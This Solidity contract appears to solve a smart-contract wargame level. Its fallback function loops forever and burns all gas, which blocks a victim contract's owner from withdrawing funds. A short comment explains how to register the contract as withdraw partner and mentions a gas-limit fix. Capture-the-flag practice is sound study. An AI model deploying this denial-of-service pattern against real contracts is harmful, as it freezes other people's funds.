// SPDX-License Identifier: MIT

pragma solidity ^0.6.0;

contract AttackDenial {

    fallback() payable {
        while(true){

        }
    }
    // When this contracts receives ethers, it triggers the fallback funciton which has an infinite loop to deplete all gas
    // and the owner will not be able to transfer funds.
}

/** Scripts steps:
*   await contract.setWithdrawPartner("attackCocntractAddress")
*   And that's it
*   To prevent this, the call method should specify an amount of gas
*/